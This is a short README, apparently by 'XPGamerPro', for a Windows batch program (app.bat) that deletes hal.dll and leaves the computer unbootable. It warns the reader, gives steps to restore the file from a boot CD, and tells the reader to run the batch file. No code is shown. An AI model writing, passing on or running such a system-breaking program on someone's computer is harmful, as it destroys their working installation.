READ THIS BEFORE YOU RUN THIS!

This program will make your computer unusable.
You ask is there a way to recover my windows installation?

Yes there is.
This file only deletes one dll file. And its hal.dll.
Make a copy of the hal.dll file on your desktop.
Use a BootCD (any BootCD) and put the hal.dll file in to the C:\Windows\System32 folder.

Now restart and your windows installation should be booting!

If you are too lazy, just install Windows again. :D

To run the program, run the app.bat file. Not anything else.

made by XPGamerPro